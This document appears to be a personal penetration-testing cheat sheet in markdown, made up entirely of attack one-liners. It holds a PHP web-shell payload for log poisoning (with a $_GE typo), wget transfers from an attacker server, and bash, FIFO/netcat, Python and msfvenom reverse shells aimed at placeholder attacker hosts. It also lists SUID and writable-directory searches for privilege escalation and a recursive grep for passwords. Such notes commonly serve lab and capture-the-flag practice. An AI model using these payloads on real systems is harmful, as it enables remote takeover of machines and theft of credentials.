# Notes

---

## Exploitation Payloads

### Log Poisoning (GET parameter injection)

```
User-Agent: <?php system($_GE['cmd']);?> 
```
---

## File Transfer

### Start a minimal Python HTTP server

```python
python3 -m http.server < port>
```


### Download with wget

```
wget http://< IP>:< port>/< file>
```

---

## Reverse Shell

### Netcat listener

```
nc -lvnp < port>
```

### Bash‑style reverse shell

```
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

### FIFO‑based reverse shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacker IP> <Port> >/tmp/f
```

### Python reverse shell 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("< IP>", < Port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Windows reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > /path/to/payload/file
```

---

## Shell Stabilization

### Using script utility

```
/usr/bin/script -qc /bin/bash /dev/null
```

---

## Privilege Escalation Helpers

### Find SUID binaries

```
find / -perm -u=s -type f 2>/dev/null
```

### Check for writable directories

```
find / -writable -type d 2>/dev/null
```

---


## Linux Discovery Commands

### Find readable config files

```
find / -type f -name "*.conf" 2>/dev/null
```

### Search for credentials in files

```
grep -Ri "password" / 2>/dev/null
```

---

